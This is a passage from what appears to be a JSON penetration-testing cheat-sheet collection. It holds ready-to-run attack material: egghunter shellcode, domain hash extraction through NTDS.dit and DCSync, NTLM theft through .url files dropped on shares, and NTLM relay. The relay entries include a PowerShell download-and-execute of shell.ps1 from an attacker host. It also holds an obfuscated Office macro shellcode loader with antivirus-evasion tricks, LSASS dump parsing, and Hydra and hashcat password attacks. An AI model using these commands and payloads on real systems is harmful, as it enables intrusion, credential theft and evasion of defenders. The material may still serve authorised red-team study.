            "code": "import struct\n\negg = b\"HACK\"   # Your custom egg\negg_value = struct.unpack(\"<I\", egg)[0]  # Convert to little-endian dword\n\n# Replace bytes 18-21 in egghunter with new egg value\negghunter = egghunter[:18] + struct.pack(\"<I\", egg_value) + egghunter[22:]"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Modify the egg value in the egghunter."
          }
        ]
      },
      {
        "title": "Prepend Egg to Shellcode",
        "codes": [
          {
            "lang": "python",
            "code": "egg = b\"w00t\"\nshellcode = b\"\"  # Your msfvenom shellcode\n\n# Full payload to be placed in memory\nfull_payload = egg + egg + shellcode"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Prepare the full payload with egg marker."
          }
        ]
      },
      {
        "title": "Using with Keystone Engine",
        "codes": [
          {
            "lang": "python",
            "code": "from keystone import *\n\nks = Ks(KS_ARCH_X86, KS_MODE_32)\n\ncode = \"\"\"\n    loop_inc_page:\n        or dx, 0x0fff\n    loop_inc_one:\n        inc edx\n        push edx\n        push 0x02\n        pop eax\n        int 0x2e\n        cmp al, 0x05\n        pop edx\n        je loop_inc_page\n        mov eax, 0x74303077\n        mov edi, edx\n        scasd\n        jnz loop_inc_one\n        scasd\n        jnz loop_inc_one\n        jmp edi\n\"\"\"\n\nencoding, count = ks.asm(code)\negghunter = bytes(encoding)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Assemble egghunter dynamically."
          }
        ]
      },
      {
        "title": "Syscall Number Issue [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "The syscall number (0x02) may vary between Windows versions:\n- **Windows XP/2003**: NtAccessCheckAndAuditAlarm = 0x02\n- **Windows 7+**: Syscall numbers changed significantly\n- For portability, consider SEH-based egghunter instead",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Testing Egghunter",
        "codes": [
          {
            "lang": "text",
            "code": "1. Set breakpoint at egghunter start\n2. Place egg+shellcode somewhere in memory\n3. Step through egghunter\n4. Verify it finds egg and jumps to shellcode"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Verify egghunter finds the egg."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Skape Egghunter Paper",
        "url": "http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "System call-based egghunter using NtAccessCheckAndAuditAlarm to safely probe memory."
      }
    ]
  },
  {
    "category": "NTDS.dit Extraction",
    "title": "NTDS.dit Extraction",
    "tags": [
      "Credential_Access",
      "Impacket",
      "Windows"
    ],
    "steps": [
      {
        "title": "VSS Shadow Copy Method",
        "codes": [
          {
            "lang": "bash",
            "code": "vssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM\nvssadmin delete shadows /for=C: /quiet"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "ntdsutil Method",
        "codes": [
          {
            "lang": "bash",
            "code": "ntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\temp\\ntds_dump\" \"quit\" \"quit\""
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Files saved to `C:\\temp\\ntds_dump\\Active Directory\\ntds.dit` and `C:\\temp\\ntds_dump\\registry\\SYSTEM`.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Extract Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > domain_hashes.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "DCSync - No File Copy Needed",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"lsadump::dcsync /domain:<Domain> /all /csv\" \"exit\" > dcsync_all.txt"
          },
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"lsadump::dcsync /domain:<Domain> /user:Administrator\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Requires replication rights (DA, Enterprise Admin, or specific ACL).",
            "variant": "important"
          }
        ]
      },
      {
        "title": "DCSync from Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump <Domain>/<Username>:<Password>@<DomainController> > dcsync_remote.txt"
          },
          {
            "lang": "bash",
            "code": "impacket-secretsdump -hashes :<NTLMHash> <Domain>/<Username>@<DomainController>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Validate Extracted Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DCIP> -u Administrator -H '<NTLMHash>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u Administrator -H '<NTLMHash>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "nxc smb <DCIP> -u users.txt -H hashes.txt -d <Domain> --no-bruteforce --continue-on-success"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "HackTricks NTDS.dit",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-information-in-printers#ntds.dit"
      },
      {
        "text": "HackTricks DCSync",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Extract all domain hashes from a Domain Controller. Requires DA/SYSTEM on DC.",
        "variant": "important"
      }
    ]
  },
  {
    "category": "NTLM Relay",
    "title": "NTLM Capture via File Shares",
    "tags": [
      "Lateral_Movement",
      "NTLM",
      "NTLM_Relay",
      "SMB",
      "Windows"
    ],
    "steps": [
      {
        "title": "File Types for Share Drops",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**Best choice:** `.url` files work on modern Windows\n`.url` (URL field) - Browse to folder - Works on modern Windows\n`.url` (ICONFILE) - Browse to folder - Works on modern Windows\n`.lnk` - Browse to folder - Works on modern Windows\n`.scf` - Browse to folder - Patched\n`desktop.ini` - Browse to folder - Patched"
          }
        ]
      },
      {
        "title": "Setup ntlm_theft",
        "codes": [
          {
            "lang": "bash",
            "code": "cd /opt/ && git clone https://github.com/Greenwolf/ntlm_theft"
          },
          {
            "lang": "bash",
            "code": "cd ntlm_theft && python3 -m venv ntlm_theft_venv && source ntlm_theft_venv/bin/activate"
          },
          {
            "lang": "bash",
            "code": "pip3 install xlsxwriter"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Generate Malicious Files",
        "codes": [
          {
            "lang": "bash",
            "code": "responder -I <Interface>"
          },
          {
            "lang": "bash",
            "code": "python3 ntlm_theft.py -g modern -s <AttackerIP> -f payroll"
          },
          {
            "lang": "bash",
            "code": "python3 ntlm_theft.py -g url -s <AttackerIP> -f payroll"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Start Responder or ntlmrelayx first to capture the auth.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Upload to Writable Share",
        "codes": [
          {
            "lang": "bash",
            "code": "smbclient //<TargetIP>/<Share> -U <User>%<Pass> -c \"put payroll/payroll-(icon).url\""
          },
          {
            "lang": "bash",
            "code": "smbclient //<TargetIP>/<Share> -U <User>%<Pass> -c \"put payroll/@payroll.url\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Manual .url File",
        "codes": [
          {
            "lang": "ini",
            "code": "[InternetShortcut]\nURL=file://<AttackerIP>/share"
          },
          {
            "lang": "ini",
            "code": "[InternetShortcut]\nURL=https://google.com\nIconIndex=0\nIconFile=\\\\<AttackerIP>\\share\\icon.ico"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "High-Value Share Targets",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**NETLOGON** - All domain users access during logon\n**SYSVOL** - GPO-related, frequently accessed\n**Department shares** - HR, Finance, IT - active users\n**Project folders** - Targeted teams\n**Public/Common** - High traffic"
          }
        ]
      },
      {
        "title": "Crack Captured NetNTLMv2",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt"
          },
          {
            "lang": "bash",
            "code": "hashcat -O -m 5600 -a 0 -r /usr/share/hashcat/rules/best64.rule hashes.txt /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Crack NetNTLMv1",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 5500 hashes.txt /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "ntlm_theft",
        "url": "https://github.com/Greenwolf/ntlm_theft"
      },
      {
        "text": "HackTricks NTLM Theft",
        "url": "https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Drop malicious files on writable shares. When users browse to the folder, their system auto-authenticates to your capture server.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "NTLM Relay",
    "title": "NTLM Relay Attack",
    "tags": [
      "Lateral_Movement",
      "NTLM",
      "NTLM_Relay",
      "SMB",
      "Windows"
    ],
    "steps": [
      {
        "title": "Check SMB Signing",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> --gen-relay-list relay_targets.txt"
          },
          {
            "lang": "bash",
            "code": "nxc smb <TargetCIDR> --gen-relay-list relay_targets.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Check with Nmap",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -p445 --script smb2-security-mode <TargetIP>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Start Responder (Capture Mode)",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf\nsudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf"
          },
          {
            "lang": "bash",
            "code": "sudo responder -I <Interface> -dwv"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Disable SMB and HTTP in **Responder** to let **ntlmrelayx** handle them.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Start ntlmrelayx",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-ntlmrelayx -tf relay_targets.txt -smb2support"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Relay to Dump SAM",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-ntlmrelayx -tf relay_targets.txt -smb2support"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Relay for Interactive Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "postNotes": [
          {
            "type": "note",
            "content": "Connect to shell with: `nc 127.0.0.1 11000`",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Relay to Execute Command",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c \"whoami\""
          },
          {
            "lang": "bash",
            "code": "impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c \"powershell IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/shell.ps1')\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Relay to LDAP for ACL Abuse",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-ntlmrelayx -t ldaps://<DC_IP> --escalate-user <Username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Relay to ADCS (ESC8)",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "If AD Certificate Services web enrollment is enabled.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Coerce Authentication with PetitPotam",
        "codes": [
          {
            "lang": "bash",
            "code": "PetitPotam.py <KaliIP> <TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Force target to authenticate to your relay server.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Coerce with PrinterBug",
        "codes": [
          {
            "lang": "bash",
            "code": "printerbug.py <Domain>/<Username>:<Password>@<TargetIP> <KaliIP>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Validate Relayed Access",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <RelayedUser> -H '<NTLMHash>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "HackTricks NTLM Relay",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntlm-relay"
      },
      {
        "text": "Impacket ntlmrelayx",
        "url": "https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Capture NTLM authentication and relay it to another service. Works when SMB signing is disabled/not required. Can gain code execution or dump credentials.",
        "variant": "info"
      },
      {
        "type": "note",
        "content": "**Requirements:**\n- SMB signing disabled or not required on target\n- Ability to intercept/coerce authentication (ARP spoofing, LLMNR/NBT-NS poisoning, **PetitPotam**)\n- Target machine different from source of authentication",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Office AV Bypass",
    "title": "Office AV Bypass",
    "tags": [
      "Defense_Evasion",
      "Windows"
    ],
    "steps": [
      {
        "title": "VBA String Obfuscation",
        "substeps": [
          {
            "title": "Character Code Obfuscation",
            "codes": [
              {
                "lang": "vba",
                "code": "' Original: \"powershell\"\nDim cmd As String\ncmd = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "String Concatenation",
            "codes": [
              {
                "lang": "vba",
                "code": "Dim ps As String\nps = \"pow\" & \"ersh\" & \"ell\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Reverse String",
            "codes": [
              {
                "lang": "vba",
                "code": "Function ReverseString(s As String) As String\n    Dim i As Integer\n    For i = Len(s) To 1 Step -1\n        ReverseString = ReverseString & Mid(s, i, 1)\n    Next\nEnd Function\n\n' Usage: ReverseString(\"llehsrewop\") returns \"powershell\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Variable Name Obfuscation",
            "codes": [
              {
                "lang": "vba",
                "code": "' Use meaningless variable names\nDim x1a2b As String\nDim q9z8y As Object\nSet q9z8y = CreateObject(\"WScript.Shell\")\nx1a2b = \"calc.exe\"\nq9z8y.Run x1a2b"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "VBA Stomping",
        "substeps": [
          {
            "title": "VBA Stomping Theory",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "How VBA stomping works:\n- Office documents contain both VBA source and compiled p-code\n- When macro runs, p-code is executed (faster)\n- Source code only needed for editing\n- Remove source to evade source-based detection",
                "variant": "info"
              }
            ]
          },
          {
            "title": "EvilClippy Tool",
            "codes": [
              {
                "lang": "bash",
                "code": "# Stomp VBA source from document\nEvilClippy.exe -s <Document.docm>"
              },
              {
                "lang": "bash",
                "code": "# Stomp and set fake VBA source\nEvilClippy.exe -s -g fakecode.vba <Document.docm>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true,
            "notes": [
              {
                "type": "note",
                "content": "**EvilClippy** tool to stomp VBA source code.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Create Fake VBA Source",
            "codes": [
              {
                "lang": "vba",
                "code": "' fakecode.vba - innocent looking code\nSub AutoOpen()\n    MsgBox \"Document loaded successfully!\"\nEnd Sub"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Remove VBA source code from document, keep only compiled p-code. Source code not visible in VBA editor, but macro still executes.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Dechaining with WMI",
        "substeps": [
          {
            "title": "WMI Process Creation",
            "codes": [
              {
                "lang": "vba",
                "code": "Sub AutoOpen()\n    Dim objWMI As Object\n    Dim objStartup As Object\n    Dim objProcess As Object\n\n    Set objWMI = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\n    Set objStartup = objWMI.Get(\"Win32_ProcessStartup\")\n    Set objConfig = objStartup.SpawnInstance_\n    objConfig.ShowWindow = 0\n\n    Set objProcess = objWMI.Get(\"Win32_Process\")\n    objProcess.Create \"powershell -exec bypass -nop -w hidden -c \"\"<Command>\"\"\", Null, objConfig, intPID\nEnd Sub"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Scheduled Task Dechaining",
            "codes": [
              {
                "lang": "vba",
                "code": "Sub AutoOpen()\n    Dim wsh As Object\n    Set wsh = CreateObject(\"WScript.Shell\")\n    wsh.Run \"schtasks /create /tn \"\"Update\"\" /tr \"\"powershell -exec bypass -c <Command>\"\" /sc once /st 00:00 /f\", 0, True\n    wsh.Run \"schtasks /run /tn \"\"Update\"\"\", 0, True\n    wsh.Run \"schtasks /delete /tn \"\"Update\"\" /f\", 0, True\nEnd Sub"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Break parent-child process relationship. WMI spawns process without direct link to Office.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Complete Obfuscated Macro",
        "codes": [
          {
            "lang": "vba",
            "code": "Private Declare PtrSafe Function xYz Lib \"kernel32\" Alias \"VirtualAlloc\" (ByVal a As LongPtr, ByVal b As Long, ByVal c As Long, ByVal d As Long) As LongPtr\nPrivate Declare PtrSafe Function aBc Lib \"kernel32\" Alias \"RtlMoveMemory\" (ByVal a As LongPtr, ByRef b As Any, ByVal c As Long) As LongPtr\nPrivate Declare PtrSafe Function qWe Lib \"kernel32\" Alias \"CreateThread\" (ByVal a As Long, ByVal b As Long, ByVal c As LongPtr, ByVal d As Long, ByVal e As Long, ByRef f As Long) As LongPtr\n\nSub AutoOpen()\n    MyFunc\nEnd Sub\n\nSub Document_Open()\n    MyFunc\nEnd Sub\n\nSub MyFunc()\n    Dim buf As Variant\n    Dim addr As LongPtr\n    Dim i As Long\n    Dim d As Long\n    Dim r As Long\n\n    ' XOR encrypted shellcode\n    buf = Array(...)\n\n    ' XOR decrypt\n    For i = LBound(buf) To UBound(buf)\n        buf(i) = buf(i) Xor 35\n    Next i\n\n    addr = xYz(0, UBound(buf), &H3000, &H40)\n\n    For i = LBound(buf) To UBound(buf)\n        d = buf(i)\n        r = aBc(addr + i, d, 1)\n    Next i\n\n    r = qWe(0, 0, addr, 0, 0, 0)\nEnd Sub"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "VBA Stomping",
        "url": "https://vbastomp.com/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Evade AV detection in Office macros through obfuscation, stomping, and dechaining techniques.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Offline Credential Processing",
    "title": "Offline Analysis",
    "tags": [
      "Credential_Access",
      "Windows"
    ],
    "steps": [
      {
        "title": "Mimikatz Dump Analysis",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz.exe\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "pypykatz Analysis",
        "codes": [
          {
            "lang": "bash",
            "code": "pypykatz lsa minidump lsass.dmp"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Extract Specific Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz.exe\nsekurlsa::minidump lsass.dmp\nsekurlsa::msv\nsekurlsa::wdigest\nsekurlsa::kerberos"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Password Attacks",
    "title": "Offline Cracking - Hashcat",
    "tags": [
      "Credential_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Basic Attack",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m <Mode> <HashFile> /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "With Rules",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m <Mode> <HashFile> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Show Cracked Passwords",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m <Mode> <HashFile> --show"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Resume Session",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat --restore"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Mask Attack (Brute Force)",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m <Mode> <HashFile> -a 3 ?a?a?a?a?a?a"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "**Charsets:** `?l` lowercase, `?u` uppercase, `?d` digits, `?s` special, `?a` all"
          }
        ]
      },
      {
        "title": "Hybrid Attack (Word + Digits)",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m <Mode> <HashFile> -a 6 /usr/share/wordlists/rockyou.txt ?d?d?d?d"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Useful Rule Files",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Common rule files:\n- `/usr/share/hashcat/rules/best64.rule` - Fast, good coverage\n- `/usr/share/hashcat/rules/rockyou-30000.rule` - Common patterns\n- `/usr/share/hashcat/rules/d3ad0ne.rule` - Comprehensive\n- `/usr/share/hashcat/rules/dive.rule` - Large, exhaustive",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "GPU-accelerated hash cracking. Faster than CPU-based tools."
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "Offline Credential Processing",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Process LSASS Dump File",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonpasswords"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Analyze LSASS dumps offline to avoid detection.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Process Multiple Dump Files",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # sekurlsa::minidump lsass1.dmp\nmimikatz # sekurlsa::logonpasswords\nmimikatz # sekurlsa::minidump lsass2.dmp\nmimikatz # sekurlsa::logonpasswords"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "MS SQL Privilege Escalation",
    "title": "Ole Automation Procedures [alternative]",
    "tags": [
      "Exploitation",
      "Privilege_Escalation",
      "SQL",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```sql\n-- Enable Ole Automation\nEXEC sp_configure 'Ole Automation Procedures', 1\nRECONFIGURE"
      },
      {
        "type": "text",
        "content": "-- Execute command\nDECLARE @shell INT\nEXEC sp_oacreate 'wscript.shell', @shell OUTPUT\nEXEC sp_oamethod @shell, 'run', null, 'cmd.exe /c whoami > C:\\output.txt'\n```"
      }
    ]
  },
  {
    "category": "Password Attacks",
    "title": "Online Attacks (Hydra)",
    "tags": [
      "Credential_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "SSH Brute Force",
        "substeps": [
          {
            "title": "SSH with Username List",
            "codes": [
              {
                "lang": "bash",
                "code": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "hydra -l <Username> -P /usr/share/wordlists/rockyou.txt ssh://<Target>"
          }
        ]
      },
      {
        "title": "RDP Brute Force",
        "codes": [
          {
            "lang": "bash",
            "code": "hydra -l <Username> -P /usr/share/wordlists/rockyou.txt rdp://<Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "FTP Brute Force",
        "codes": [
          {
            "lang": "bash",
            "code": "hydra -l <Username> -P /usr/share/wordlists/rockyou.txt ftp://<Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SMB Brute Force",
        "codes": [
          {
            "lang": "bash",
            "code": "hydra -l <Username> -P /usr/share/wordlists/rockyou.txt smb://<Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "HTTP POST Form",
        "codes": [
          {
            "lang": "bash",
            "code": "hydra -l <Username> -P /usr/share/wordlists/rockyou.txt <Target> http-post-form \"/<LoginPath>:<UserParam>=^USER^&<PassParam>=^PASS^:<FailureString>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Capture login request in **Burp** to identify parameters and failure message.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "HTTP Basic Auth",
        "codes": [
          {
            "lang": "bash",
            "code": "hydra -l <Username> -P /usr/share/wordlists/rockyou.txt <Target> http-get /<Path>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "MySQL",
        "codes": [
          {
            "lang": "bash",
            "code": "hydra -l root -P /usr/share/wordlists/rockyou.txt <Target> mysql"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "MSSQL",
        "codes": [
          {
            "lang": "bash",
            "code": "hydra -l sa -P /usr/share/wordlists/rockyou.txt <Target> mssql"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "VNC",
        "codes": [
          {
            "lang": "bash",
            "code": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SMTP",
        "codes": [
          {
            "lang": "bash",
            "code": "hydra -l <Username> -P passwords.txt <Target> smtp -V"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Dictionary attacks against network services. Faster than brute-force but limited to wordlist contents."
      }
    ]
  },
  {
    "category": "Password Cracking",
    "title": "Online Hash Lookup",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "CrackStation",
        "codes": [
          {
            "lang": "text",
            "code": "https://crackstation.net/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Paste hash and check against massive precomputed tables."
          }
        ]
      },
      {
        "title": "HashKiller",
        "codes": [
          {
            "lang": "text",
            "code": "https://hashkiller.io/listmanager"
          }
        ],
        "optional": false,
